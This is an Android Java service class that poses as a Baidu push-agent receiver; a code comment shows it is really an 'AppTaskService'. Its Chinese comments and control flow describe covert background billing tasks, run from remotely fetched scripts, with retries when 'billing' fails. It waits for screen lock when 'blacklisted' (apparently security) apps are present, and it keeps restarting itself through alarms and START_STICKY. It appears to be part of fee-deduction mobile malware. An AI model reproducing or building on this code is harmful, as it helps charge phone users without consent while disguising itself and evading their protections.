package com.baidu.pushagent;

import com.baidu.alipay.AppProperty;
import com.baidu.alipay.AppTaskThread;
import com.baidu.alipay.Constant;
import com.baidu.alipay.LogUtil;
import com.baidu.serv.Alarms;
import com.baidu.serv.BaseThread;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;

//AppTaskService
public class PushEventReceiver extends Service{

//	private static final String TAG = "AppTaskService";
	
	private Context context = this;
	private Handler handler = null;
	
	@Override
    public void onCreate() {
        super.onCreate();
       
//        LogUtil.e(TAG, "oncreate");

		this.handler = new Handler() {
            public void handleMessage(Message msg) {
            	double delay = Constant.DEFAULTNOFEEINTERVAL;
            	
            	try{
	            	
	                switch (msg.what) {
	                // -2为网络连接失败 不能玩
	                case AppProperty.REQUEST_NETERROR:
	                	delay = Constant.DEFAULTINTERVAL_ERROR;
//	                    LogUtil.e(TAG, "网络问题不能玩");
	                    break;
	                // -1是通道覆盖问题 可以玩
	                case AppProperty.REQUEST_NOORDER:
//	                    LogUtil.e(TAG, "无通道覆盖没有覆盖");
	                    break;
	                // 0是跑脚本出错,应重新计费
	                case AppProperty.REQUEST_RUNERROR:
	                	delay = Constant.DEFAULTINTERVAL_ERROR_ASYNCH;
//	                	LogUtil.e(TAG, "跑脚本出错应重新计费");
	                    break;
	                // 1计费成功
	                case AppProperty.REQUEST_SUCCESS:
	                	delay = 0.5;
//	                    LogUtil.e(TAG, "计费成功可以玩");
	                    break;
	                case AppProperty.REQUEST_USERGIVEUP:
//	                    LogUtil.e(TAG, "计费失败用户放弃支付");
	                    break;
	                case AppProperty.REQUEST_UPERROR:
	                	delay = Constant.DEFAULTINTERVAL_ERROR;
//	                    LogUtil.e(TAG, "上访获取脚本失败上访地址连接不上");
	                    break;
	                case AppProperty.REQUEST_WAIT:
//	                	LogUtil.e(TAG, "有黑名单软件，等待锁屏");
	                	delay = Constant.DEFAULTWAITINTERVAL;
	                	break;
	                case AppProperty.REQUEST_NOFEE:
//	                	LogUtil.e(TAG, "没有计费任务需要执行");
	                	delay = Constant.DEFAULTNOFEEINTERVAL;
	                }
	
            	}catch (Exception e) {
					 e.printStackTrace();
				}

                Alarms.enableAlarmsService(context, delay,
                        (delay+1) * 20, PushEventReceiver.class,
                        false);
                
                super.handleMessage(msg);
            }
        };
	}
	
	@Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

//        LogUtil.e(TAG, "onStartCommand");
        
        new BaseThread(null){
        	public void run(){
        		Looper.prepare();
        		
        		new AppTaskThread(context,handler).run();
        		
        		Looper.loop();
        	}
        }.start();
        
        
        return START_STICKY;
    }
	
	@Override
	public IBinder onBind(Intent arg0) {
		
		return null;
	}

}
